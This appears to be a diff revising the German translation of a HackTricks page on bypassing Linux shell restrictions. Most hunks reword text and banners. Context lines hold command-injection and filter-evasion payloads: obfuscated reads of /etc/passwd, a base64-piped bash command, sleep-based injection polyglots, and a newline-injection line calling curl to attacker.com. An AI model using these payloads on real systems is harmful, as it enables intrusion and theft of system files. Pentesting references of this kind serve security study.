@@ -14,10 +14,10 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
+Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
 Heute Zugriff erhalten:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -131,7 +131,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Umgehungsrohre
+### Umgehen von Pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -156,13 +156,7 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 ### Abrufen von Zeichen aus Umgebungsvariablen
 
-In einigen Fällen können Sie versuchen, Zeichen aus Umgebungsvariablen zu extrahieren, um bestimmte Einschränkungen zu umgehen. Verwenden Sie den folgenden Befehl, um auf diese Weise auf Zeichen zuzugreifen:
-
-```bash
-echo ${!A}
-```
-
-Dieser Befehl gibt den Wert der Umgebungsvariablen aus, die mit dem Buchstaben "A" beginnen.
+In einigen Fällen können Umgebungsvariablen verwendet werden, um bestimmte Zeichen zu erhalten, die normalerweise durch Bash-Einschränkungen blockiert werden. Dies kann durch direktes Lesen der Umgebungsvariablen oder durch Ausnutzen von Schwachstellen in der Bash-Implementierung erreicht werden.
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -173,8 +167,8 @@ Sie könnten beispielsweise **burpcollab** oder [**pingb**](http://pingb.in) ver
 
 ### Eingebaute Funktionen
 
-Falls Sie externe Funktionen nicht ausführen können und nur auf einen **eingeschränkten Satz von eingebauten Funktionen zum Erlangen von RCE** zugreifen können, gibt es einige nützliche Tricks, um dies zu erreichen. Normalerweise werden Sie **nicht in der Lage sein, alle** **eingebauten Funktionen** zu verwenden, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Gefängnis zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
-Überprüfen Sie zunächst alle [**Shell-Builtins**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Hier sind einige **Empfehlungen**:
+Falls Sie externe Funktionen nicht ausführen können und nur auf einen **begrenzten Satz von eingebauten Funktionen zum Erlangen von RCE** zugreifen können, gibt es einige nützliche Tricks, um dies zu erreichen. Normalerweise werden Sie **nicht in der Lage sein, alle** **eingebauten Funktionen** zu verwenden, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Gefängnis zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
+Überprüfen Sie zunächst alle [**Shell-Befehle**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Hier sind einige **Empfehlungen**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -231,7 +225,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Umgehung möglicher Regexes
+### Umgehung möglicher Regex-Ausdrücke
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -242,21 +236,9 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 
 #### Umgehen von Bash-Einschränkungen
 
-Bash restrictions can be bypassed by using the following techniques:
+Bash restrictions can be bypassed using various techniques. Here are some useful commands to bypass common restrictions:
 
-Bash-Einschränkungen können durch Verwendung der folgenden Techniken umgangen werden:
-
-1. **Bypassing Restricted Bash**: You can bypass restricted bash by invoking a subshell using the `()` syntax.
-
-1. **Umgehen von eingeschränktem Bash**: Sie können den eingeschränkten Bash umgehen, indem Sie eine Unter-Shell mit der `()`-Syntax aufrufen.
-
-2. **Bypassing Restricted Bash Builtins**: Restricted bash builtins can be bypassed by calling the binary directly or by using the `command` built-in.
-
-2. **Umgehen von eingeschränkten Bash-Befehlen**: Eingeschränkte Bash-Befehle können umgangen werden, indem Sie das Binärprogramm direkt aufrufen oder das `command`-Builtin verwenden.
-
-3. **Bypassing Restricted Bash Functions**: Restricted bash functions can be bypassed by using the `command` built-in or by invoking a subshell.
-
-3. **Umgehen von eingeschränkten Bash-Funktionen**: Eingeschränkte Bash-Funktionen können umgangen werden, indem Sie das `command`-Builtin verwenden oder eine Unter-Shell aufrufen.
+Bash-Einschränkungen können mit verschiedenen Techniken umgangen werden. Hier sind einige nützliche Befehle, um gängige Einschränkungen zu umgehen:
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -343,9 +325,9 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Umgehung von Lese-/Ausführungs-/Distroless-Einschränkungen
+## Umgehung von Schreibgeschützten/Noexec/Distroless-Einschränkungen
 
-Wenn Sie sich in einem Dateisystem mit den **Schutzmechanismen für Lesezugriff und Ausführung oder sogar in einem distrolosen Container** befinden, gibt es dennoch Möglichkeiten, **beliebige Binärdateien auszuführen, sogar eine Shell!**:
+Wenn Sie sich in einem Dateisystem mit den **Schreibschutz- und Noexec-Schutzmaßnahmen** oder sogar in einem distrolosen Container befinden, gibt es dennoch Möglichkeiten, **beliebige Binärdateien auszuführen, sogar eine Shell!**:
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
@@ -364,7 +346,7 @@ Wenn Sie sich in einem Dateisystem mit den **Schutzmechanismen für Lesezugriff 
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
@@ -376,12 +358,12 @@ Heute noch Zugriff erhalten:
 
 <summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Weitere Möglichkeiten, HackTricks zu unterstützen:
+Andere Möglichkeiten, HackTricks zu unterstützen:
 
 * Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
